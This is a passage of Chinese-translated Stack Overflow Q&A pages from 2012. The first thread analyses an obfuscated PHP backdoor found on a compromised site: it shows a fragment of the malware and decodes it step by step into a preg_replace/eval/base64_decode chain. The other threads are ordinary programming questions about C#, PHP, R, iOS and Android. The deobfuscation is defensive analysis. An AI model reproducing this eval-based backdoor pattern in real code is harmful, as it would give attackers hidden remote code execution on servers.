$eva1tYlbakBcVSir;$eva1tYldakBcVSir = "\x73\164\x72\x65\143\x72\160\164\x72";$eva1tYlbakBcVSir = "\x67\141\x6f\133\x70\170\x65";$eva1tYldakBoVS1r = "\x65\143\x72\160";$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = $eva1tYlbakBcVSir;} ?> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-20T16:17:42.713

1.  正确缩进代码（我使用了[http://beta.phpformatter.com/](http://beta.phpformatter.com/)）

    > [http://pastebin.com/A106eFjY](http://pastebin.com/A106eFjY)

2.  查找函数调用（`func()`或`$func()`）。

    > 第 14 行：` **$eva1tYldokBcVSjr** (..., **$eva1tYldakBcVSir** (...));

3.  注释掉函数调用，和`echo $eva1tYldokBcVSjr`(and `$eva1tYldakBcVSir`) 看看它在做什么。

    > `echo $eva1tYldokBcVSjr;`=> `'preg_replace'`
    > `echo $eva1tYldakBcVSir;`=>`'strrev'`

4.  `echo`取出传递给`$eva1tYldokBcVSjr()`( `preg_replace()`) 的参数。

    > `$eva1tYidokBcVSjr[0.016 * (7812.5 * 0.016)]`=> `"@(.+)@ie"`
    > 
    > `$eva1tYidokBcVSjr[62.5 * 0.016]`=> `"eval("\1");"`
    > 
    > `strrev($eva1tYidokBcVSjr[0.061 * 0.031])`=>`"@eval(base64_decode($eva1tYidakBcVSjr[1]));"`

所以第 14 行解码为（在 PHP 正则表达式中，任何东西都可以是分隔符）：

```
preg_replace("/(.+)/ie", 'eval("\1");', eval(base64_decode($eva1tYidakBcVSjr[1]))); 
```

正在`base64_decoded`解码为包含一堆`eval`s 的代码的字符串。

> [http://pastebin.com/zRr9dMHN](http://pastebin.com/zRr9dMHN)

用 s替换所有这些`eval`s `echo`，看看发生了什么。还有*更多* `eval(base64_decode(`的s。

> [http://pastebin.com/H9WcBFyJ](http://pastebin.com/H9WcBFyJ)

*将那些* `eval`s更改为`echo`s 可以为您提供：

> [http://pastebin.com/VaYCgUyK](http://pastebin.com/VaYCgUyK)

我看到`setcookie`里面有一...

**编辑**：这是一个有人继续解码的帖子：

> [http://www.thehosthelpers.com/technical-help/help-de-obfsucating-code/msg17585#msg17585](http://www.thehosthelpers.com/technical-help/help-de-obfsucating-code/msg17585#msg17585)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-20T16:16:48.570

代码在一对一的关系中不起作用。您可以将任意数量的不同代码写入同一端。正因为如此，去混淆代码是非常困难的。您可以尝试使用一些[像这样](http://research.zscaler.com/2010/10/php-deobfuscation.html)的去混淆扩展，但我不希望恢复清晰的代码。此外，如果黑客很聪明，他会使用一些重定向和其他措施来确保即使你对代码进行了去混淆，你也无法追踪到他。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:19:15.967

我立即在 Google 上找到了这样的页面：

[http://blog.sucuri.net/2011/10/evil-backdoors-part-ii.html](http://blog.sucuri.net/2011/10/evil-backdoors-part-ii.html)

这里也已经问过了：

[我的 Wordpress 文件中的 PHP 脚本。请解码或帮我删除它](https://stackoverflow.com/questions/8046971/php-script-in-my-wordpress-files-please-decode-or-help-me-remove-it)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:19:29.210

忽略第一个长变量 ($eva1fYlbakBcVSir)。您可以浏览并回显使用转义序列编写的其他变量，然后您可以破译其余代码。

# actionscript-3 - 加载外部 swf 后的根引用

> ID：11583133
> 
> 赞同：0
> 
> 时间：2012-07-20T16:11:20.403
> 
> 标签：actionscript-3, flash, external, root, loader

我正在将游戏 swf 加载到我的 swf 中。然而，游戏的预加载器（来自库）在尝试引用它时遇到了根问题。我认为这是因为根现在是我的主要 swf 而不是预加载器 swf。有谁知道加载 swf 并允许它保留自己的根目录的方法？对我来说，更改加载代码比更改游戏预加载器代码要容易得多。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T00:13:14.767

我认为如果您使用名称而不是“root”来引用显式引用 main.swf 根，然后将“this”用于预加载器，会更容易。

例如，假设您的文档类称为 Main（如 Main.as）。

然后在您的 Preloader MovieClip 代码中......如果您正在为预加载器编写一个类，请执行以下操作：

```
public function Preloader() {
    addEventListener(Event.ADDED_TO_STAGE, init, false, 0, true);               
}

private function init(e:Event):void {
    var main = (root as Main);

    // do stuff with "main here"
    main.addEventListner(...); // reference the main.swf
    this.addEventListener(...); // reference the preloader
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T19:46:42.597

抱歉，这是一个我从未真正解决过的问题，不得不通过更改我正在加载的 swf 中的代码来解决这个问题。我找不到其他方法让它引用正确的数据。

谢谢大家的帮助：）

# c# - 代理和 htmlagilitypack 问题

> ID：11583137
> 
> 赞同：0
> 
> 时间：2012-07-20T16:11:26.763
> 
> 标签：c#, vb.net, html-parsing, html-agility-pack

我一直在尝试通过代理使用 htmlagilitypack，但我发现我得到了一些不可预测的行为。

如何向 htmlagilitypack 添加凭据，以便它能够通过代理抓取网页？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T17:39:52.703

这是我通常做的：

```
HttpWebRequest request = (HttpWebRequest) HttpWebRequest.Create(url);
...
HttpWebResponse response = (HttpWebResponse) request.GetResponse();

using (var reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8)) {
    var doc = new HtmlDocument();
    doc.Load(reader.BaseStream);

    //Use (or return) the HtmlDocument 'doc' here.
} 
```

您可以将此代码封装在一个给定 url、返回一个对象的*方法上。*`HtmlDocument`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-12-10T16:27:51.390

这里已经回答了一个类似的问题 在此处[输入链接描述](https://stackoverflow.com/questions/12099538/using-a-proxy-with-htmlagilitypack)

您在代码中使用它如下。

```
HtmlWeb web = new HtmlWeb();
web.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";
var doc = web.Load(string url, string proxyHost, int proxyPort, string yourUserId, string yourPassword); 
```

# c# - 在 COM 可见 DLL 终止后保持窗体运行

> ID：11583147
> 
> 赞同：0
> 
> 时间：2012-07-20T16:12:09.430
> 
> 标签：c#, .net, com

我在 C# 中创建了一个 COM Visible DLL，它应该在主机应用程序（非托管）中用户的一些输入后显示一个表单。它可以正常工作`ShowDialog()`，但理想情况下，即使在 DLL 完成后，表单也应该继续运行。因为表单需要一些数据，所以不能使用单独的项目`Main(string[] args)`。

我怎样才能做到这一点？我尝试了类似的方法，但没有奏效。

```
public class FormManager : ApplicationContext
{
    FormMain frmMain;

    public FormManager()
        :base(new FormMain())
    {
        frmMain = (FormMain)this.MainForm;
        frmMain.Closed += new EventHandler(OnFormClosed);
    }

    public void SetData(object o1, object o2)
    {
        if (frmMain != null)
        {
            frmMain.SetData(o1, o2);
            frmMain.Show();
        }
    }

    private void OnFormClosed(object sender, EventArgs e)
    {
            ExitThread();
    }
} 
```

我不知道`Application.Run`应该在哪里插入。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T17:41:21.173

我也有点不清楚你*到底*想在这里做什么......但通常，如果你将`Application.Run`放在该代码中的某个地方，它将代替这一行：

```
frmMain.Show(); 
```

当然，通过使用，`Application.Run`您将冻结此代码（调用 Application.Run 的线程），直到有问题的表单关闭……所以也许这并不能真正实现您想要的（确实，不清楚）。

* * *

**澄清问题后编辑**

* * *

这是关于 .NET 中的 COM 的事情，这与 Microsoft 语言的先前迭代不同。当您通过 COM (OLE) 在 .NET 中调用程序集时，调用程序集会将 COM 公开的代码包含在其运行时中。换句话说，当您查看任务管理器时，您不会看到两个程序集都在运行！您只会看到发出呼叫的那个。因此，当您关闭主程序集时，您会关闭附加到它的所有正在运行的代码，包括您的 COM 代码。

有一种方法可以解决这个问题，但这并不简单。简而言之，您需要：

1.  启动您的第二个进程（例如，您可以使用 Process.Start()）
2.  使用第一个过程查看 ROT（运行对象表）内部并找到第二个程序集
3.  通过 COM (OLE) 自由通信并传递您的数据

此时，两个程序集在不同的运行时中运行，这将**允许您在第二个程序集中生成不会在第一个程序集关闭时关闭的表单**。据我了解，这就是您要寻找的东西。

如果您想尝试这条路线，请在谷歌上搜索一下 ROT 并尝试一些示例代码。如果您对此有任何疑问，请告诉我！

# facebook-graph-api - 从 Facebook 教育中提取大学——“教育”领域不被认可

> ID：11583149
> 
> 赞同：0
> 
> 时间：2012-07-20T16:12:15.603
> 
> 标签：facebook-graph-api

嗨，我正在尝试从他们的 Facebook 个人资料中提取用户的大学，并发现这篇文章很有用 - [Getting Education with Facebook Graph API in PHP](https://stackoverflow.com/questions/6171438/getting-education-with-facebook-graph-api-in-php)

但是，在我的实现中，由于某种原因无法识别“教育”字段，并且在“未定义索引：教育”的浏览器中引发错误。这很奇怪，因为名字和姓氏以及性别都可以正常检索，但“教育”字段却没有。

有谁知道为什么会这样？

我的代码：

```
// Get the app User ID
$user = $facebook->getUser();

if ($user) {
    try {
        // If the user has been authenticated then proceed
        $user_profile = $facebook->api('/me');

        // Extracting profile information to store in database
        $fname   = $user_profile['first_name'];
        $lname   = $user_profile['last_name'];
        $gender  = $user_profile['gender'];
        $email   = $user_profile['email'];
        $college = null;

        /* Education data is stored in an array so this iterates over
        the contents of that array and checks if the entry is for "College".  
        */

        foreach ($user_profile['education'] as $education) { // <-ERROR HERE
            if ($education['type'] == "College") {
                $college = $education;
                break;
            }
        }
    }
    catch (FacebookApiException $e) {
        error_log($e);
        $user = null;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:21:18.143

从用户教育栏，您可以阅读 facebook 用户的学校名称、id 和类型。只需在运行 fql 的变量中获取学校名称。欲了解更多信息请检查：[https ://developers.facebook.com/docs/reference/fql/user/](https://developers.facebook.com/docs/reference/fql/user/)

# ios - 如何使用大型中央调度过滤集合并在完成后更新 UITableView？

> ID：11583154
> 
> 赞同：0
> 
> 时间：2012-07-20T16:12:31.380
> 
> 标签：ios, uitableview, grand-central-dispatch

我正在尝试使用大型中央调度过滤 NSArray。我能够过滤数组，当我调用`[tableView reloadData]`正确的值时，NSLog 正在打印；但是视图显示了以前的值。

例如，如果我的项目集合是`Red, Orange, Yellow`并且我过滤了`r`，则 NSLogs 将打印有 2 行并且单元格是`Red`and `Orange`，但所有三个单元格都将显示。当搜索变为 时`ra`，NSLog 显示只有 1 行被调用`Orange`，但单元格`Red`和`Orange`被显示；

```
- (void)filterItems:(NSString *)pattern{
       __weak MYSearchViewController *weakSelf = self; 
       dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
           NSMutableArray *items = [weakSelf.items copy];
           //lots of code to filter the items 
           dispatch_async(dispatch_get_main_queue(), ^{
               weakSelf.items = [items copy];
               [weakSelf.tableView reloadData];
           });
       });
}
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    NSLog(@"Rows: %d",[self.items count]);
    return [self.items count];
}
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"MYCell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault
                                          reuseIdentifier:CellIdentifier];
    }
    NSInteger row = [indexPath row];   
    MYItem *item = [self.items objectAtIndex:row];
    //code to setup cell 
    NSLog(@"Row %d, Item %@, Cell %d", row, item.info, cell.tag);
    return cell;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T23:31:49.573

尝试这个：

```
- (void)filterItems:(NSString *)pattern
{
       NSMutableArray *array = [NSMutableArray arrayWithArray:items];
       dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
           //lots of code to filter the items using "array", NOT items
           dispatch_async(dispatch_get_main_queue(), ^{
               items = array; // or [NSArray arrayWithArray:array] if you really don't want a mutable array
               [tableView reloadData];
           });
       });
} 
```

评论：你不需要使用 self. 是的，当块运行时 self 将被保留，但当块完成时它将再次释放。如果这个对象在它运行时真的可以消失，那么好吧，使用对 self 的弱引用。

您在本地使用“items”作为名称，在块中，我将局部变量名称更改为数组以确保。

# r - 从 POSIXlt 日期时间变量中提取工作日

> ID：11583166
> 
> 赞同：1
> 
> 时间：2012-07-20T16:13:14.877
> 
> 标签：r, datetime

超级简单的问题，不知何故我无法通过阅读文档来弄清楚。我正在将日期/时间变量读入 POSIXlt 形式，如下所示：

```
data$date <-strptime(unformatted.date, %m/%d/%Y %H:%M) 
```

然后，我试图创建一个代表工作日的因子变量：

```
data$weekday <- as.POSIXlt(data$date, format="%A") 
```

这将返回一个为 NA 的变量。帮助！（如果这是大多数人可以从文档中得到的东西，我深表歉意......我真的已经阅读过，但找不到答案）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-20T16:18:29.453

```
ttt<-strptime("07/20/2012 18:00", "%m/%d/%Y %H:%M")
ttt
weekdays(ttt)
#[1] "Friday" 
```

这可以通过`?POSIXlt`仔细阅读来发现。

PS：`factor(ttt$hour)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-12T20:04:36.883

```
library(lubridate)
ttt<-strptime("01/12/2018 18:00", "%m/%d/%Y %H:%M")
wday(ttt)
[1] 6 #Sunday=1
wday(ttt,label=TRUE)
[1] Fri 
```

如果您需要使用数字，这种方法可以节省您的转换

# iphone - 来自 Hockey 的 CrashReport，带有 NSPlaceholderDictionary 的尴尬 Stacktrace

> ID：11583168
> 
> 赞同：0
> 
> 时间：2012-07-20T16:13:25.047
> 
> 标签：iphone, ios, ios5, crash, interface-builder

从我开发的应用程序中得到了一些奇怪的堆栈跟踪。这里是堆栈跟踪：

```
Exception Type:  SIGTRAP
Exception Codes: #0 at 0x312b1848
Crashed Thread:  0

Application Specific Information:
*** Terminating app due to uncaught exception 'NSInvalidArgumentException', 
reason: '*** -[__NSPlaceholderDictionary initWithObjects:forKeys:count:]: 
attempt to insert nil object from objects[0]'

Thread 0 Crashed:
0   libsystem_kernel.dylib              0x35c48848 __kill + 8
1   CoreFoundation                      0x34dba957 __handleUncaughtException + 75
2   libobjc.A.dylib                     0x361e1345 _objc_terminate + 129
3   libc++abi.dylib                     0x000043c5 safe_handler_caller(void (*)()) + 77
4   libc++abi.dylib                     0x00004451 operator delete(void*) + 1
5   libc++abi.dylib                     0x00005825 __cxa_current_exception_type + 1
6   libobjc.A.dylib                     0x361e12a9 objc_exception_rethrow + 13
7   CoreFoundation                      0x34d1050d CFRunLoopRunSpecific + 405
8   CoreFoundation                      0x34d1036d CFRunLoopRunInMode + 105
9   GraphicsServices                    0x36f85439 GSEventRunModal + 137
10  UIKit                               0x32df5cd5 UIApplicationMain + 1081
11  myApp                               0x000073f9 main (main.m:42) 
```

当您单击 tableview 并且应将视图推送到导航控制器时会发生这种情况。我从来没有复制过这个错误，所以我不能准确地说它是什么时候发生的。

可能只有 iOS 5.1.1 受到影响（仅存在此版本的崩溃报告）。我总是在将对象添加到字典之前检查它们，所以加载 xibs 可能是这样做的原因吗？也许它有点损坏，我认识到有时xibs以一种非常奇怪的方式......

感谢您的帮助

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-21T02:42:14.097

如果您的崩溃报告器没有报告异常回溯，则需要对其进行修复。`objc_exception_rethrow`自 iOS 5（近一年前！）以来，主线程上的异常已被捕获并“重新抛出”（因此）。

我认为 __NSPlaceholderDictionary 正是你通过调用 [NSDictionary alloc] 得到的。我怀疑罪魁祸首是`[NSDictionary dictionaryWithObject:x forKey:@"foo"]`没有检查`x`非零的代码。

iTunes Connect 的崩溃报告也可能会有所帮助，尽管它们会显示实际崩溃的一*小*部分。

# php - 终止与 jQuery AJAX 请求的连接，继续在服务器端处理 php？

> ID：11583170
> 
> 赞同：0
> 
> 时间：2012-07-20T16:13:36.690
> 
> 标签：php, jquery, ajax

我有一个注册表单，它调用可以与我们 CRM 的 API 交互的 PHP 脚本，如下所示：

CRM API <--> PHP 脚本 <--> 注册表单

1.  注册表单在一次 AJAX 调用中将一些信息传递给 PHP 脚本
2.  PHP 脚本对 CRM 运行十几个 API 调用以创建帐户并附加各种数据
3.  CRM 将它刚刚创建的新帐户 ID 返回到 PHP 脚本
4.  PHP 脚本将帐户 ID 传递回注册表单，此时 AJAX 调用完成并且注册表单可以继续。

问题是 #2，这十几个调用大约需要 20 秒才能完成，但是注册表所需的数据是在第一次 API 调用之后生成的，因此理论上它可以更快地返回该数据，并在没有服务器端的情况下完成其余的工作一直保持该 AJAX 调用打开。

我尝试了 flush() 和 ob_flush() ，它们在处理完成之前将帐户 ID 输出到客户端，但是 jQuery AJAX 连接保持打开状态，所以我仍然卡在等待在注册表单端关闭连接之前发生任何事情.

那么尽快将该帐户 ID 返回到表单的最简单方法是什么？

也许使用 curl 和 exec 突破？

```
 if(signing up){
      stuff
      exec(curl myself, notsignup)
 }
 else {
      bunch of api calls
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:28:09.337

您可能应该考虑为所需的其余步骤创建一个单独的过程。一种方法是您可以在 #1 第一个 api 调用完成之后。它响应用户，并且不会尝试在用户端完成其余 20 个调用。

然后创建一个队列来完成其余的工作。您总是可以在 mysql 中创建一个表来存储队列。

接下来只需创建一个将在后台运行的 cronjob，将队列排除在外。

注意：您不会希望这个 cronjob 只是启动并且永不停止。也许让它每 5 分钟运行一次，但在它开始运行之前，请检查是否有另一个 cron 仍在进行中。如果是，那么它将再检查 5 分钟以查看是否可以运行。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:19:40.497

如果您只需要第一个 API 调用中的信息来返回表单，那么我可能会尝试不同的工作流程：

1.  表单调用 PHP 脚本
2.  PHP 调用第一个 API 调用
3.  PHP 返回表单
4.  表单处理响应
5.  表单调用第二个 PHP 脚本来完成该过程
6.  PHP 完成 API 调用（此时表单可以放弃，因为听起来您不关心从现在开始会发生什么）。

工作流程需要开发人员进行更多的工作和协调，但会向用户提供响应最快的界面。

# sharepoint - sharepoint 2010 从数据库中查询数据

> ID：11583174
> 
> 赞同：0
> 
> 时间：2012-07-20T16:14:13.050
> 
> 标签：sharepoint, sharepoint-2010

在主页 home.aspx 上，我想从 Oracle 数据库中查询一些数据。

我已经仔细寻找过这样的选择，但我找不到任何与之相关的东西。

有人可以指导我吗？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T19:44:44.373

安装 Oracle 连接器并将其注册为安全的 SharePoint Web 的 web.config。像使用任何其他 sql 连接器一样使用它，但应该使用 OracleConnection。

我自己会选择一种不同的方法，而是开发了一个 webpart。如果您在 SharePoint 2010 中开发和部署 Webpart 项目，则任何使用的模块都应在部署期间自动正确注册。从这里开始， http: [//msdn.microsoft.com/en-us/sharepoint/ee513148.aspx](http://msdn.microsoft.com/en-us/sharepoint/ee513148.aspx)

如果您不知道上述内容的含义，您可能不应该以这种方式与 SharePoint 混淆！（对不起，这是真的）

# r - 动态时间序列预测和rollapply

> ID：11583177
> 
> 赞同：1
> 
> 时间：2012-07-20T16:14:17.240
> 
> 标签：r, time-series

我正在尝试对 R 中的动态时间序列进行滚动预测（然后计算出预测的平方误差）。我基于[这个 StackOverflow question](https://stackoverflow.com/q/8488147)的很多代码，但我对 R 很陌生，所以我很挣扎。任何帮助将非常感激。

```
require(zoo)
require(dynlm)

set.seed(12345)
#create variables
x<-rnorm(mean=3,sd=2,100)
y<-rep(NA,100)
y[1]<-x[1]
for(i in 2:100) y[i]=1+x[i-1]+0.5*y[i-1]+rnorm(1,0,0.5)
int<-1:100
dummydata<-data.frame(int=int,x=x,y=y)

zoodata<-as.zoo(dummydata)

prediction<-function(series)
  {
  mod<-dynlm(formula = y ~ L(y) + L(x), data = series) #get model
   nextOb<-nrow(series)+1
   #make forecast
   predicted<-coef(mod)[1]+coef(mod)[2]*zoodata$y[nextOb-1]+coef(mod)[3]*zoodata$x[nextOb-1]

   #strip timeseries information
   attributes(predicted)<-NULL

   return(predicted)
  }                

rolling<-rollapply(zoodata,width=40,FUN=prediction,by.column=FALSE) 
```

这将返回：

```
20          21      .....      80
10.18676  10.18676          10.18676 
```

这有两个我没想到的问题：

1.  从 20->80 运行，而不是我期望的 40->100（因为宽度是 40）
2.  它给出的预测是不变的：10.18676

我究竟做错了什么？有没有比全部写出来更简单的方法来进行预测？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T20:35:33.697

`data`您的函数的主要问题是`dynlm`. 如果你往里看，`?dynlm`你会发现`data`参数必须是一个`data.frame`或一个`zoo`对象。不幸的是，我刚刚了解到`rollapply`将您的`zoo`对象拆分为`array`对象。这意味着`dynlm`，在注意到您的参数形式不正确之后，在您的*全局*`data`环境中搜索`x`并搜索，这当然是在您的代码顶部定义的。解决方案是转换为对象。您的代码还有其他几个问题，我在这里发布了一个更正的版本：`y`*`series``zoo`*

 *```
prediction<-function(series) {
   mod <- dynlm(formula = y ~ L(y) + L(x), data = as.zoo(series)) # get model
   # nextOb <- nrow(series)+1 # This will always be 21\. I think you mean:
   nextOb <- max(series[,'int'])+1 # To get the first row that follows the window
   if (nextOb<=nrow(zoodata)) {   # You won't predict the last one
     # make forecast
     # predicted<-coef(mod)[1]+coef(mod)[2]*zoodata$y[nextOb-1]+coef(mod)[3]*zoodata$x[nextOb-1]
     # That would work, but there is a very nice function called predict
     predicted=predict(mod,newdata=data.frame(x=zoodata[nextOb,'x'],y=zoodata[nextOb,'y']))
     # I'm not sure why you used nextOb-1  
     attributes(predicted)<-NULL
     # I added the square error as well as the prediction.
     c(predicted=predicted,square.res=(predicted-zoodata[nextOb,'y'])^2)
   }
}    

rollapply(zoodata,width=20,FUN=prediction,by.column=F,align='right') 
```

你的第二个问题，关于你的结果的编号，可以由`align`参数控制`rollapply`。`left`会给你`1..60`，`center`（默认）会给你`20..80`并`right`得到你`40..100`。*

# php - 即使用户没有填写表单中的所有条件，也从 mySQL 返回结果

> ID：11583178
> 
> 赞同：1
> 
> 时间：2012-07-20T16:14:23.657
> 
> 标签：php, mysql, pdo

以下代码需要使用用户提供的 3 个变量。默认情况下，所有这些变量都等于 0。

1.  时间（文本框）
2.  城市（下拉列表）
3.  类型（下拉列表）

例如，如果用户给出时间和城市，但让类型为零，则不会返回任何结果。我的问题是什么是修改我现有代码的有效且高效的方法，以便如果用户选择不选择时间、城市或类型或这些的任何组合，将返回结果？

例如，如果*时间*21:00 添加*城市*编号 3，它将显示所有满足 2 条件的*类型*应列出。

```
$question= 'SELECT * FROM events WHERE ABS(TIMESTAMPDIFF( HOUR , `time`, :time )) < 2 AND city=:city AND type=:type';
$query = $db->prepare($question);
$query->bindValue(":time", $time, PDO::PARAM_INT);
$query->bindValue(":city", $city, PDO::PARAM_INT);
$query->bindValue(":type", $type, PDO::PARAM_INT);
$query->execute(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:23:59.953

```
<?php
$question= 'SELECT * FROM events WHERE ';

$hasTime = false;
if(!empty($time)) { // @note better validation here
    $hasTime = true;
    $question .= 'ABS(TIMESTAMPDIFF( HOUR , `time`, :time )) < 2 ';
}

$hasCity = false;
if(!empty($city)) { // @note better validation here
    $hasCity = true;
    $question .= 'AND city=:city ';
}

$hasType = false;
if(!empty($type)) { // @note better validation here
    $hasType = true;
    $question .= 'AND type=:type';
}

$query = $db->prepare($question);

if($hasTime)
    $query->bindValue(":time", $time, PDO::PARAM_INT);
if($hasCity)
    $query->bindValue(":city", $city, PDO::PARAM_INT);
if($hasType)
    $query->bindValue(":type", $type, PDO::PARAM_INT);

$query->execute();
$results = $query->fetchAll();

if(empty($results))
    echo 'no results';
else
    // $results is an array of arrays 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-20T16:22:25.610

我更喜欢使用条件数组，并检查条件是否存在，以构建 SQL 查询的各个部分：

```
$conditions = array(); // Creating an array of conditions.
if ($time) // Checks to see if value exists.
{
    $timeCondition = "ABS(TIMESTAMPDIFF( HOUR , `time`, :time )) < 2";
    $conditions[] = $timeCondition; // Adds this condition string to the array.
}
if ($city)
{
    $cityCondition = "city=:city";
    $conditions[] = $cityCondition;
}
if ($type)
{
    $typeCondition = "type=:type";
    $conditions[] = $typeCondition;
}

$conditionString = implode(" AND ", $conditions); // Gluing the values of the array with " AND " in between the string conditions.

if (count($conditions) > 0) // If conditions exist, add "WHERE " to the condition string.
{
    $conditionString = "WHERE ".$conditionString;
}
else // Otherwise, the condition string is blank by default.
{
    $conditionString = '';
}

$question= 'SELECT * FROM events '.$conditionString; // If no conditions, will return all from events. Otherwise, conditions will be slotted in through $conditionString.

$query = $db->prepare($question);

if($time)
    $query->bindValue(":time", $time, PDO::PARAM_INT);
if($city)
    $query->bindValue(":city", $city, PDO::PARAM_INT);
if($type)
    $query->bindValue(":type", $type, PDO::PARAM_INT);

$query->execute(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-20T16:24:56.557

You can use a series of `IF()` statements in your SQL statement, and return true if the value isn't set. So something like this:

```
...WHERE IF(:time, ABS(TIMESTAMPDIFF(HOUR, `time`, :time)) < 2, 1)
AND IF(:city, city=:city, 1) AND IF(:type, type=:type, 1) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:22:24.920

动态构建查询，以便如果该字段为其默认值，则不要将其包含在 where 子句中。

```
$conditions = array();
if ($_POST['time']) {
    $conditions[] = "ABS(TIMESTAMPDIFF( HOUR , `time`, :time )) < 2";
}
if ($_POST['city']) {
    $conditions[] = "city=:city";
}
if ($_POST['type']) {
    $conditions[] = "type=:type";
}

$conditionString = implode(" AND ", $conditions);
if (count($conditions) > 0) {
    $conditionString = "WHERE " . $conditionString;
}
else {
    $conditionString = '';
}
$question = 'SELECT * FROM events ' . $conditionString; 
```

# android - TYPE_NOTIFICATION 与 MediaPlayer

> ID：11583179
> 
> 赞同：1
> 
> 时间：2012-07-20T16:14:26.173
> 
> 标签：android, media-player

我正在尝试使用简单的通知声音作为我的应用程序中的声音。但我就是无法让它工作。使用 RingManager.TYPE_NOTIFICATION 时根本没有声音。我应该提一下，当我使用 TYPE_ALARM 或 TYPE_RINGTONE（或 TYPE_ALL = 在我的手机中是 TYPE_RINGTONE）时，它可以工作。我也尝试了 setVolume()，但没有结果。

当我此时（从另一部手机）向自己发送消息时，我可以听到通知声音。

有些人试图帮助我，但仍然没有解决。也许有人可以给我最简单的eclipse项目，我可以检查它是否有效？也许只是我的手机有问题？我有三星 Galaxy S2。

这是我的代码。我做错了什么？或者我还应该检查什么？

```
Uri _sound = RingtoneManager.getDefaultUri( RingtoneManager.TYPE_NOTIFICATION ); 
// _sound.toString() returns "content://settings/system/notification_sound"

// this doesn't work either
// Uri _sound = RingtoneManager.getActualDefaultRingtoneUri( getApplicationContext(), RingtoneManager.TYPE_NOTIFICATION );
// _sound.toString() returns "content://media/internal/audio/media/10" if it can help

mp = new MediaPlayer();
try {
    // doesn't change anything while using TYPE_NOTIFICATION
    // mp.setVolume(1.0f, 1.0f); 

    // tried also mp.setDataSource(context, Settings.System.DEFAULT_NOTIFICATION_URI);
    // but no effect
    mp.setDataSource( getApplicationContext(), _sound );
    mp.setLooping( false );
    mp.prepare();
} catch( IOException e ) {}
mp.start(); 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:48:27.390

您可以尝试改用此语法：

```
Uri _sound = RingtoneManager.getActualDefaultRingtoneUri(Context, RingtoneManager.TYPE_NOTIFICATION); 
```

这对我有用。

你也可以试试这个：

```
mp.setDataSource(context, Settings.System.DEFAULT_NOTIFICATION_URI); 
```

# php - 保持连接以使用 fsockopen 下载图像？

> ID：11583180
> 
> 赞同：0
> 
> 时间：2012-07-20T16:14:26.277
> 
> 标签：php, http, keep-alive, fsockopen

我制作了一个基本脚本来获取 html 页面和图像。但我想在检索图片时继续保持联系。
- 我对测试脚本所做的一直是在 Web 服务器上询问地址。但它没有用。
那么我该怎么做或者我做错了什么？

基本脚本：

```
function fetch( $server, $url, $port = 80, &$resp_head )
{
    if ( !$con = @fsockopen($server, $port, $error_number, $error_string, 30) ) return False;
    stream_set_timeout( $con, 8600 );

    // Reguest
    $qry_header = 'GET '.$url." HTTP/1.1\r\n";
    $qry_header .= 'Host: '.$server."\r\n";
    $qry_header .= 'User-Agent: Mihtyom; (+http://'.$_SERVER['HTTP_HOST']."/)\r\n";
    $qry_header .= "Accept: */*\r\n";           //google check the 3 "Accept"
    $qry_header .= "Accept-Language: *\r\n";
    $qry_header .= "Accept-Encoding: *\r\n";
    $qry_header .= "Connection: Close\r\n\r\n";
    fwrite( $con, $qry_header );

    $inheader = True;
    $data = '';
    while (!feof( $con ))
    {
        $line = fgets( $con );
        if (!$inheader)
        {
            $data .= $line;
            continue;
        }
        if ($line == "\n" || $line == "\r\n")
        {
            $inheader = False;
            continue;
        }
        $resp_head[] = trim($line);
    }

    fclose( $con );

    return $data;
} 
```

测试脚本：

```
function fetch( $server, $urls, $port = 80, &$resp_head )
{
    if ( !$con = @fsockopen($server, $port, $error_number, $error_string, 30) ) return False;
    stream_set_timeout( $con, 8600 );

    $resp_head = array();
    $data = array();
    foreach ($urls as $key => $url)
    {
        $inheader = True;
        $data[$key] = '';

        // Reguest
        $qry_header = 'GET '.$url." HTTP/1.1\r\n";
        $qry_header .= 'Host: '.$server."\r\n";
        $qry_header .= 'User-Agent: Mihtyom; (+http://'.$_SERVER['HTTP_HOST']."/)\r\n";
